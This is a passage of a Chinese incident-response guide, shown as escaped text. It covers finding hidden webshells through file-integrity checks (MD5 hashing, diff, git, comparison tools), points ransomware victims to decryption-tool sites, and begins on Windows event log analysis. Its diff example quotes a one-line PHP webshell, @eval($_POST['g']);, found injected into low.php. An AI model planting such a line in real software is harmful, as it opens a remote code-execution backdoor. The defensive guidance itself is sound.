\u5373\u4f7f\u662f\u4e00\u6b3e\u62e5\u670999.9%\u7684Webshell\u68c0\u51fa\u7387\u7684\u68c0\u6d4b\u5f15\u64ce\uff0c\u4f9d\u7136\u53ef\u80fd\u5b58\u5728Webshell\u7ed5\u8fc7\u7684\u60c5\u51b5\u3002\u53e6\u5916\uff0c\u50cf\u6697\u94fe\u3001\u7f51\u9875\u52ab\u6301\u3001\u9875\u9762\u8df3\u8f6c\u7b49\u5e38\u89c1\u7684\u9ed1\u5e3dSEO\u624b\u6cd5\uff0c\u4e5f\u5f88\u96be\u901a\u8fc7\u624b\u52a8\u68c0\u6d4b\u6216\u5de5\u5177\u68c0\u6d4b\u5168\u90e8\u8bc6\u522b\u51fa\u6765\u3002 \u6700\u597d\u7684\u65b9\u5f0f\u5c31\u662f\u505a\u6587\u4ef6\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002\u901a\u8fc7\u4e0e\u539f\u59cb\u4ee3\u7801\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u5feb\u901f\u53d1\u73b0\u6587\u4ef6\u662f\u5426\u88ab\u7be1\u6539\u4ee5\u53ca\u88ab\u7be1\u6539\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\uff0c\u7b2c\u4e00\u4e2a\u524d\u63d0\u662f\uff0c\u4f60\u6240\u5728\u7684\u56e2\u961f\u5df2\u5177\u5907\u4ee3\u7801\u7248\u672c\u7ba1\u7406\u7684\u80fd\u529b\uff0c\u5982\u679c\u4f60\u662f\u4e2a\u4eba\u7ad9\u957f\uff0c\u76f8\u4fe1\u4f60\u5df2\u7ecf\u5907\u4efd\u4e86\u539f\u59cb\u4ee3\u7801\u3002 \u672c\u6587\u5c06\u7ed3\u5408\u5b9e\u9645\u5e94\u7528\uff0c\u4ecb\u7ecd\u51e0\u79cd\u6587\u4ef6\u5b8c\u6574\u6027\u9a8c\u8bc1\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f60\u627e\u51fa\u4ee3\u7801\u4e2d\u6240\u6709\u9690\u85cf\u7684\u540e\u95e8\u3002 1\u3001\u6587\u4ef6MD5\u6821\u9a8c \u4e0b\u8f7dD\u76fe_Web\u67e5\u6740\u5de5\u5177\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u7559\u610f\u5230\u4e0b\u8f7d\u7684\u538b\u7f29\u5305\u91cc\uff0c\u9664\u4e86\u6709\u4e00\u4e2aexe\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a\u6587\u4ef6md5\u503c\u3002\u8fd9\u4e2a\u662f\u8f6f\u4ef6\u4f5c\u8005\u5728\u53d1\u5e03\u8f6f\u4ef6\u65f6\uff0c\u901a\u8fc7md5\u7b97\u6cd5\u8ba1\u7b97\u51fa\u8be5exe\u6587\u4ef6\u7684\u201c\u7279\u5f81\u503c\u201d\u3002 \u4e0b\u8f7d\u5730\u5740\uff1ahttp://www.d99net.net/down/WebShellKill_V2.0.9.zip \u6587\u4ef6MD5\uff1a29285decadbce3918a4f8429ec33df46 WebShellKill.exe \u5f53\u7528\u6237\u4e0b\u8f7d\u8f6f\u4ef6\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u6821\u9a8c\u7b97\u6cd5\u8ba1\u7b97\u4e0b\u8f7d\u5230exe\u6587\u4ef6\u7684\u7279\u5f81\u503c\uff0c\u5e76\u4e0e\u8f6f\u4ef6\u5f00\u53d1\u8005\u53d1\u5e03\u7684\u7279\u5f81\u503c\u6bd4\u8f83\u3002\u5982\u679c\u4e24\u4e2a\u7279\u5f81\u503c\u76f8\u540c\uff0c\u5219\u8ba4\u4e3a\u4e0b\u8f7d\u5230\u7684exe\u6587\u4ef6\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e24\u4e2a\u7279\u5f81\u503c\u4e0d\u540c\uff0c\u5219\u8ba4\u4e3a\u4e0b\u8f7d\u5230exe\u6587\u4ef6\u662f\u88ab\u7be1\u6539\u8fc7\u7684\u3002 \u90a3\u540c\u7406\u53ef\u5f97\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6240\u6709\u7f51\u7ad9\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21hash\u503c\u4fdd\u5b58\uff0c\u5f53\u51fa\u73b0\u5e94\u6025\u60c5\u51b5\u65f6\uff0c\u91cd\u65b0\u8ba1\u7b97\u4e00\u6b21hash\u503c\uff0c\u5e76\u4e0e\u4e0a\u6b21\u4fdd\u5b58\u7684hash\u503c\u8fdb\u884c\u5bf9\u6bd4\uff0c\u4ece\u800c\u8f93\u51fa\u65b0\u521b\u5efa\u7684\u3001\u4fee\u6539\u8fc7\u53ca\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 \u6587\u4ef6hash\u503c\u8ba1\u7b97\uff1a def md5sum(file): m=hashlib.md5() if os.path.isfile(file): f=open(file,'rb') for line in f: m.update(line) f.close else: m.update(file) return (m.hexdigest()) \u5bf9\u6587\u4ef6\u8fdb\u884c\u54c8\u5e0c\u503c\u91cd\u65b0\u8ba1\u7b97\uff0c\u8fdb\u884c\u6821\u9a8c\u5bf9\u6bd4\uff0c\u6d4b\u8bd5\u6548\u679c\uff1a \u5982\u4e0a\u56fe\uff0c\u5728\u4e0a\u4f20\u76ee\u5f55\u65b0\u589e\u4e86\u4e00\u4e2aevil.php\u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a\u88ab\u7be1\u6539\u7684\u6587\u4ef6\u662flow.php\u3002\u4f7f\u7528\u5e38\u89c1\u7684\u7f16\u8f91\u5668NotePad++\u8fdb\u884c\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53d1\u73b0low.php\u6587\u4ef6\u91cc\u88ab\u63d2\u5165\u4e86\u4e00\u53e5\u8bddwebshell\u3002 2\u3001diff\u547d\u4ee4 \u5728linux\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528diff\u6765\u6bd4\u8f83\u4e24\u4e2a\u6587\u672c\u6587\u4ef6\u7684\u5dee\u5f02\u3002\u540c\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u5feb\u901f\u627e\u51fa\u4e24\u4e2a\u9879\u76ee\u6587\u4ef6\u7684\u5dee\u5f02\u3002 diff -c -a -r cms1 cms2 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u524d\u4e09\u884c\u5217\u51fa\u4e86\u4e24\u4e2a\u8981\u5bf9\u6bd4\u7684\u6587\u4ef6\u76ee\u5f55\u7684\u5dee\u5f02\uff0c\u53ef\u4ee5\u53d1\u73b0low.php\u6587\u4ef6\u88ab\u7be1\u6539\u8fc7\uff0c\u7be1\u6539\u7684\u5185\u5bb9\u662f @eval($_POST['g']); \u3002 \u5907\u6ce8\uff1a\u5982\u679c\u53ea\u662f\u60f3\u67e5\u770b\u4e24\u4e2a\u6587\u4ef6\u662f\u5426\u4e0d\u540c\u53c8\u4e0d\u60f3\u663e\u793a\u5dee\u5f02\u4e4b\u5904\u7684\u8bdd\uff0c\u53ef\u4ee5\u52a0\u4e0a\uff0dq\u9009\u9879\u3002 3\u3001\u7248\u672c\u63a7\u5236\u5de5\u5177 \u7248\u672c\u63a7\u5236\u5de5\u5177\uff0c\u6bd4\u5982\u8bf4git\uff0c\u91cd\u65b0\u4e0a\u4f20\u4ee3\u7801\u5230git\uff0cadd+commit+push\uff0c\u7136\u540e\u6253\u5f00\u9879\u76ee\uff0c\u70b9\u51fbcommits\uff0c\u5728\u5386\u53f2\u63d0\u4ea4\u7248\u672c\u91cc\u9762\uff0c\u67e5\u770b\u6587\u4ef6\u66f4\u6539\u5185\u5bb9\uff0c\u5f88\u5bb9\u6613\u5c31\u53ef\u4ee5\u53d1\u73b0\u4ee3\u7801\u88ab\u7be1\u6539\u7684\u5730\u65b9\u4e86\u3002 \u53e6\u5916\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7git diff \u7528\u6765\u6bd4\u8f83\u6587\u4ef6\u4e4b\u95f4\u7684\u4e0d\u540c\u3002 4\u3001\u6587\u4ef6\u5bf9\u6bd4\u5de5\u5177 \u5173\u952e\u8bcd\uff1a\u4ee3\u7801\u5bf9\u6bd4\u5de5\u5177\uff0c\u4f60\u4f1a\u627e\u5230\u5f88\u591a\u597d\u7528\u7684\u5de5\u5177\uff0c\u8fd9\u91cc\u6211\u4eec\u63a8\u8350\u4e24\u6b3e\u6548\u679c\u8fd8\u4e0d\u9519\u7684\u5de5\u5177\uff0cBeyond Compare\u548cWinMerge\u3002 Beyond Compare Beyond Compare\u662f\u4e00\u5957\u7531Scooter Software\u63a8\u51fa\u7684\u6587\u4ef6\u6bd4\u8f83\u5de5\u5177\u3002\u4e3b\u8981\u7528\u9014\u662f\u5bf9\u6bd4\u4e24\u4e2a\u6587\u4ef6\u5939\u6216\u8005\u6587\u4ef6\uff0c\u5e76\u5c06\u5dee\u5f02\u4ee5\u989c\u8272\u6807\u793a\uff0c\u6bd4\u8f83\u8303\u56f4\u5305\u62ec\u76ee\u5f55\uff0c\u6587\u6863\u5185\u5bb9\u7b49\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.scootersoftware.com/download.php \u8f6f\u4ef6\u4f7f\u7528\u793a\u4f8b\uff0c\u901a\u8fc7\u6587\u4ef6\u5939\u6bd4\u8f83\uff0c\u627e\u51fa\u6587\u4ef6\u5939\u4e2d\u7684\u5dee\u5f02\u5185\u5bb9\u3002 1\u3001\u53cc\u51fbBeyond Compare \uff0c\u6253\u5f00\u8f6f\u4ef6\u4e3b\u9875\uff0c\u9009\u62e9\u6587\u4ef6\u5939\u6bd4\u8f83\u3002 2\u3001\u5728\u53cc\u8fb9\u680f\u8f93\u5165\u6587\u4ef6\u5939\u8def\u5f84\uff0c\u70b9\u51fb\u663e\u793a\u5dee\u522b\uff0c\u5217\u51fa\u5dee\u5f02\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u7d2b\u8272\u90e8\u5206\u4e3a\u65b0\u589e\u6587\u4ef6\uff0c\u7ea2\u8272\u90e8\u5206\u4e3a\u7be1\u6539\u6587\u4ef6\u3002 3\u3001\u53cc\u51fb\u5177\u4f53\u6587\u4ef6\uff0c\u8fdb\u5165\u4ee3\u7801\u5bf9\u6bd4\uff0c\u627e\u5230\u4ee3\u7801\u5dee\u5f02\u90e8\u5206\u3002 WinMerge WinMerge\u662f\u4e00\u6b3e\u8fd0\u884c\u4e8eWindows\u7cfb\u7edf\u4e0b\u7684\u6587\u4ef6\u6bd4\u8f83\u548c\u5408\u5e76\u5de5\u5177\uff0c\u4f7f\u7528\u5b83\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u6bd4\u8f83\u6587\u4ef6\u5939\u548c\u6587\u4ef6\uff0c\u4ee5\u6613\u4e8e\u7406\u89e3\u7684\u53ef\u89c6\u6587\u672c\u683c\u5f0f\u663e\u793a\u5dee\u5f02\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://winmerge.org/downloads/ 1\u3001\u6587\u4ef6--\u6253\u5f00\uff0c\u9009\u62e9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\uff0c\u7136\u540e\u70b9\u51fb\u8fdb\u884c\u6bd4\u8f83\u3002 2\u3001\u5728\u540c\u4e00\u4e2a\u754c\u9762\u91cc\uff0c\u901a\u8fc7\u989c\u8272\u548c\u6587\u672c\u63d0\u793a\uff0c\u663e\u793a\u6587\u4ef6\u5939\u5185\u5bb9\u5dee\u5f02\u3002","title":"\u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684Webshell\u540e\u95e8"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#5","text":"\u7ecf\u5e38\u4f1a\u6709\u4e00\u4e9b\u5c0f\u4f19\u4f34\u95ee\uff1a\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u8be5\u600e\u4e48\u529e\uff0c\u53ef\u4ee5\u89e3\u5bc6\u5417\uff1f \u7b2c\u4e00\u6b21\u9047\u5230\u52d2\u7d22\u75c5\u6bd2\u662f\u5728\u65e9\u51e0\u5e74\u7684\u65f6\u5019\uff0c\u5ba2\u6237\u56e0\u7f51\u7ad9\u8bbf\u95ee\u5f02\u5e38\uff0c\u8fdb\u800c\u8fdc\u7a0b\u534f\u52a9\u8fdb\u884c\u6392\u67e5\u3002\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u53ca\u9644\u4ef6\u540e\u7f00\u540d\u88ab\u7be1\u6539\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u90fd\u6709\u4e00\u4e2a\u6587\u4ef6\u6253\u5f00\u540e\u663e\u793a\u52d2\u7d22\u63d0\u793a\u4fe1\u606f\uff0c\u8fd9\u4fbf\u662f\u52d2\u7d22\u75c5\u6bd2\u7684\u7279\u5f81\u3002 \u51fa\u4e8e\u804c\u4e1a\u4e60\u60ef\uff0c\u6211\u6253\u5305\u4e86\u90e8\u5206\u52a0\u5bc6\u6587\u4ef6\u6837\u672c\u548c\u52d2\u7d22\u75c5\u6bd2\u63d0\u793a\u4fe1\u606f\u7528\u4e8e\u7559\u6863\uff0c\u5c31\u5728\u4eca\u5929\uff0c\u6211\u53c8\u91cd\u65b0\u4e0a\u4f20\u4e86\u6837\u672c\uff0c\u81f3\u4eca\u4f9d\u7136\u65e0\u6cd5\u89e3\u5bc6\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u5b89\u5168\u5de5\u7a0b\u5e08\uff0c\u800c\u975e\u4e00\u4e2a\u4e13\u4e1a\u7684\u75c5\u6bd2\u5206\u6790\u5e08\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u5404\u5927\u5b89\u5168\u516c\u53f8\u7684\u80fd\u529b\uff0c\u5bfb\u627e\u52d2\u7d22\u75c5\u6bd2\u7684\u89e3\u5bc6\u5de5\u5177\u3002 \u672c\u6587\u6574\u7406\u4e86\u4e00\u4efd\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357\uff0c\u901a\u8fc7\u52d2\u7d22\u75c5\u6bd2\u7d22\u5f15\u5f15\u64ce\u67e5\u627e\u52d2\u7d22\u75c5\u6bd2\u76f8\u5173\u4fe1\u606f\uff0c\u518d\u901a\u8fc7\u5404\u4e2a\u5b89\u5168\u516c\u53f8\u63d0\u4f9b\u7684\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u89e3\u5bc6\u3002\u5f53\u7136\uff0c\u80fd\u5426\u89e3\u5bc6\u5168\u51ed\u8fd0\u6c14\uff0cso\uff0c\u5e73\u65f6\u8fd8\u662f\u52e4\u6253\u8865\u4e01\u591a\u5907\u4efd\u3002 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce \u5728\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\u8f93\u5165\u75c5\u6bd2\u540d\u3001\u52d2\u7d22\u90ae\u7bb1\u3001\u88ab\u52a0\u5bc6\u540e\u6587\u4ef6\u7684\u540e\u7f00\u540d\uff0c\u6216\u76f4\u63a5\u4e0a\u4f20\u88ab\u52a0\u5bc6\u6587\u4ef6\u3001\u52d2\u7d22\u63d0\u793a\u4fe1\u606f\uff0c\u5373\u53ef\u53ef\u5feb\u901f\u67e5\u627e\u5230\u75c5\u6bd2\u8be6\u60c5\u548c\u89e3\u5bc6\u5de5\u5177\u3002 \u8fd9\u4e9b\u7f51\u7ad9\u7684\u89e3\u5bc6\u80fd\u529b\u8fd8\u5728\u6301\u7eed\u66f4\u65b0\u4e2d\uff0c\u662f\u503c\u5f97\u6536\u85cf\u7684\u51e0\u4e2a\u52d2\u7d22\u75c5\u6bd2\u5de5\u5177\u578b\u7f51\u7ad9\u3002 \u3010360\u3011 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u652f\u6301\u68c0\u7d22\u8d85\u8fc7800\u79cd\u5e38\u89c1\u52d2\u7d22\u75c5\u6bd2\uff0c http://lesuobingdu.360.cn \u3010\u817e\u8baf\u3011 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u652f\u6301\u68c0\u7d22\u8d85\u8fc7 300 \u79cd\u5e38\u89c1\u52d2\u7d22\u75c5\u6bd2 https://guanjia.qq.com/pr/ls/ \u3010\u542f\u660e\u3011VenusEye\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u8d85300\u79cd\u52d2\u7d22\u75c5\u6bd2\u5bb6\u65cf https://lesuo.venuseye.com.cn/ \u3010\u5947\u5b89\u4fe1\u3011\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce https://lesuobingdu.qianxin.com/ \u3010\u6df1\u4fe1\u670d\u3011\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce https://edr.sangfor.com.cn/#/information/ransom_search \u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 \u5f88\u591a\u5b89\u5168\u516c\u53f8\u90fd\u63d0\u4f9b\u4e86\u514d\u8d39\u7684\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u4e0b\u8f7d\uff0c\u6536\u96c6\u548c\u6574\u7406\u76f8\u5173\u4e0b\u8f7d\u5730\u5740\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u548c\u83b7\u53d6\u6700\u65b0\u7684\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u3002 \u3010\u817e\u8baf\u54c8\u52c3\u3011\u52d2\u7d22\u8f6f\u4ef6\u4e13\u6740\u5de5\u5177 https://habo.qq.com/tool/index \u3010\u91d1\u5c71\u6bd2\u9738\u3011\u52d2\u7d22\u75c5\u6bd2\u514d\u75ab\u5de5\u5177 http://www.duba.net/dbt/wannacry.html \u3010\u706b\u7ed2\u3011\u5b89\u5168\u5de5\u5177\u4e0b\u8f7d http://bbs.huorong.cn/forum-55-1.html \u3010\u745e\u661f\u3011\u89e3\u5bc6\u5de5\u5177\u4e0b\u8f7d http://it.rising.com.cn/fanglesuo/index.html \u3010nomoreransom\u3011\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 https://www.nomoreransom.org/zh/index.html \u3010MalwareHunterTeam\u3011\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 https://id-ransomware.malwarehunterteam.com/ \u3010\u5361\u5df4\u65af\u57fa\u3011\u514d\u8d39\u52d2\u7d22\u89e3\u5bc6\u5668 https://noransom.kaspersky.com/ \u3010Avast\u3011\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177 https://www.avast.com/zh-cn/ransomware-decryption-tools \u3010Emsisoft\u3011\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177 https://www.emsisoft.com/ransomware-decryption-tools/free-download \u3010Github\u9879\u76ee\u3011\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u6536\u96c6\u6c47\u603b https://github.com/jiansiting/Decryption-Tools","title":"\u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","text":"\u7b2c1\u7bc7:Window\u65e5\u5fd7\u5206\u6790 \u00b6 0x01 Window\u4e8b\u4ef6\u65e5\u5fd7\u7b80\u4ecb \u00b6 Windows\u7cfb\u7edf\u65e5\u5fd7\u662f\u8bb0\u5f55\u7cfb\u7edf\u4e2d\u786c\u4ef6\u3001\u8f6f\u4ef6\u548c\u7cfb\u7edf\u95ee\u9898\u7684\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u76d1\u89c6\u7cfb\u7edf\u4e2d\u53d1\u751f\u7684\u4e8b\u4ef6\u3002\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u68c0\u67e5\u9519\u8bef\u53d1\u751f\u7684\u539f\u56e0\uff0c\u6216\u8005\u5bfb\u627e\u53d7\u5230\u653b\u51fb\u65f6\u653b\u51fb\u8005\u7559\u4e0b\u7684\u75d5\u8ff9\u3002 Windows\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u7c7b\u65e5\u5fd7\u8bb0\u5f55\u7cfb\u7edf\u4e8b\u4ef6\uff1a\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\u548c\u5b89\u5168\u65e5\u5fd7\u3002 \u7cfb\u7edf\u65e5\u5fd7 \u8bb0\u5f55\u64cd\u4f5c\u7cfb\u7edf\u7ec4\u4ef6\u4ea7\u751f\u7684\u4e8b\u4ef6\uff0c\u4e3b\u8981\u5305\u62ec\u9a71\u52a8\u7a0b\u5e8f\u3001\u7cfb\u7edf\u7ec4\u4ef6\u548c\u5e94\u7528\u8f6f\u4ef6\u7684\u5d29\u6e83\u4ee5\u53ca\u6570\u636e\u4e22\u5931\u9519\u8bef\u7b49\u3002\u7cfb\u7edf\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u7684\u65f6\u95f4\u7c7b\u578b\u7531Windows\u2002NT/2000\u64cd\u4f5c\u7cfb\u7edf\u9884\u5148\u5b9a\u4e49\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx \u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7 \u5305\u542b\u7531\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u7a0b\u5e8f\u8bb0\u5f55\u7684\u4e8b\u4ef6\uff0c\u4e3b\u8981\u8bb0\u5f55\u7a0b\u5e8f\u8fd0\u884c\u65b9\u9762\u7684\u4e8b\u4ef6\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u7a0b\u5e8f\u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u6587\u4ef6\u9519\u8bef\uff0c\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u81ea\u884c\u51b3\u5b9a\u76d1\u89c6\u54ea\u4e9b\u4e8b\u4ef6\u3002\u5982\u679c\u67d0\u4e2a\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u5d29\u6e83\u60c5\u51b5\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ece\u7a0b\u5e8f\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u627e\u5230\u76f8\u5e94\u7684\u8bb0\u5f55\uff0c\u4e5f\u8bb8\u4f1a\u6709\u52a9\u4e8e\u4f60\u89e3\u51b3\u95ee\u9898\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx \u5b89\u5168\u65e5\u5fd7 \u8bb0\u5f55\u7cfb\u7edf\u7684\u5b89\u5168\u5ba1\u8ba1\u4e8b\u4ef6\uff0c\u5305\u542b\u5404\u79cd\u7c7b\u578b\u7684\u767b\u5f55\u65e5\u5fd7\u3001\u5bf9\u8c61\u8bbf\u95ee\u65e5\u5fd7\u3001\u8fdb\u7a0b\u8ffd\u8e2a\u65e5\u5fd7\u3001\u7279\u6743\u4f7f\u7528\u3001\u5e10\u53f7\u7ba1\u7406\u3001\u7b56\u7565\u53d8\u66f4\u3001\u7cfb\u7edf\u4e8b\u4ef6\u3002\u5b89\u5168\u65e5\u5fd7\u4e5f\u662f\u8c03\u67e5\u53d6\u8bc1\u4e2d\u6700\u5e38\u7528\u5230\u7684\u65e5\u5fd7\u3002\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0c\u5b89\u5168\u6027\u65e5\u5fd7\u662f\u5173\u95ed\u7684\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u7ec4\u7b56\u7565\u6765\u542f\u52a8\u5b89\u5168\u6027\u65e5\u5fd7\uff0c\u6216\u8005\u5728\u6ce8\u518c\u8868\u4e2d\u8bbe\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u4ee5\u4fbf\u5f53\u5b89\u5168\u6027\u65e5\u5fd7\u6ee1\u540e\u4f7f\u7cfb\u7edf\u505c\u6b62\u54cd\u5e94\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx \u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u5b58\u50a8\u7740\u6545\u969c\u6392\u9664\u4fe1\u606f\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u5458\u66f4\u4e3a\u6709\u7528\u3002 \u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\u7740\u4e8b\u4ef6\u5ba1\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u9a8c\u8bc1\uff08\u767b\u5f55\u3001\u8fdc\u7a0b\u8bbf\u95ee\u7b49\uff09\u548c\u7279\u5b9a\u7528\u6237\u5728\u8ba4\u8bc1\u540e\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48\uff0c\u5bf9\u4e8e\u8c03\u67e5\u4eba\u5458\u800c\u8a00\uff0c\u66f4\u6709\u5e2e\u52a9\u3002 0X02 \u5ba1\u6838\u7b56\u7565\u4e0e\u4e8b\u4ef6\u67e5\u770b\u5668 \u00b6 Windows Server 2008 R2 \u7cfb\u7edf\u7684\u5ba1\u6838\u529f\u80fd\u5728\u9ed8\u8ba4\u72b6\u6001\u4e0b\u5e76\u6ca1\u6709\u542f\u7528 \uff0c\u5efa\u8bae\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff0c\u82e5\u65e5\u540e\u7cfb\u7edf\u51fa\u73b0\u6545\u969c\u3001\u5b89\u5168\u4e8b\u6545\u5219\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u6392\u9664\u6545\u969c\uff0c\u8ffd\u67e5\u5165\u4fb5\u8005\u7684\u4fe1\u606f\u7b49\u3002 PS\uff1a\u9ed8\u8ba4\u72b6\u6001\u4e0b\uff0c\u4e5f\u4f1a\u8bb0\u5f55\u4e00\u4e9b\u7b80\u5355\u7684\u65e5\u5fd7\uff0c\u65e5\u5fd7\u9ed8\u8ba4\u5927\u5c0f20M \u8bbe\u7f6e1 \uff1a\u5f00\u59cb \u2192 \u7ba1\u7406\u5de5\u5177 \u2192 \u672c\u5730\u5b89\u5168\u7b56\u7565 \u2192 \u672c\u5730\u7b56\u7565 \u2192 \u5ba1\u6838\u7b56\u7565\uff0c\u53c2\u8003\u914d\u7f6e\u64cd\u4f5c\uff1a \u8bbe\u7f6e2 \uff1a\u8bbe\u7f6e\u5408\u7406\u7684\u65e5\u5fd7\u5c5e\u6027\uff0c\u5373\u65e5\u5fd7\u6700\u5927\u5927\u5c0f\u3001\u4e8b\u4ef6\u8986\u76d6\u9600\u503c\u7b49\uff1a \u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\u65b9\u6cd5\uff1a \u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d** \u6309 \" Window+R \"\uff0c\u8f93\u5165 \u201d eventvwr.msc \u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u201c \u4e8b\u4ef6\u67e5\u770b\u5668 \u201d 0x03 \u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790 \u00b6 \u5bf9\u4e8eWindows\u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790\uff0c\u4e0d\u540c\u7684EVENT ID\u4ee3\u8868\u4e86\u4e0d\u540c\u7684\u610f\u4e49\uff0c\u6458\u5f55\u4e00\u4e9b\u5e38\u89c1\u7684\u5b89\u5168\u4e8b\u4ef6\u7684\u8bf4\u660e\uff1a \u4e8b\u4ef6ID \u8bf4\u660e 4624 \u767b\u5f55\u6210\u529f 4625 \u767b\u5f55\u5931\u8d25 4634 \u6ce8\u9500\u6210\u529f 4647 \u7528\u6237\u542f\u52a8\u7684\u6ce8\u9500 4672 \u4f7f\u7528\u8d85\u7ea7\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u8fdb\u884c\u767b\u5f55 4720 \u521b\u5efa\u7528\u6237 \u6bcf\u4e2a\u6210\u529f\u767b\u5f55\u7684\u4e8b\u4ef6\u90fd\u4f1a\u6807\u8bb0\u4e00\u4e2a\u767b\u5f55\u7c7b\u578b\uff0c\u4e0d\u540c\u767b\u5f55\u7c7b\u578b\u4ee3\u8868\u4e0d\u540c\u7684\u65b9\u5f0f\uff1a \u767b\u5f55\u7c7b\u578b \u63cf\u8ff0 \u8bf4\u660e 2 \u4ea4\u4e92\u5f0f\u767b\u5f55\uff08Interactive\uff09 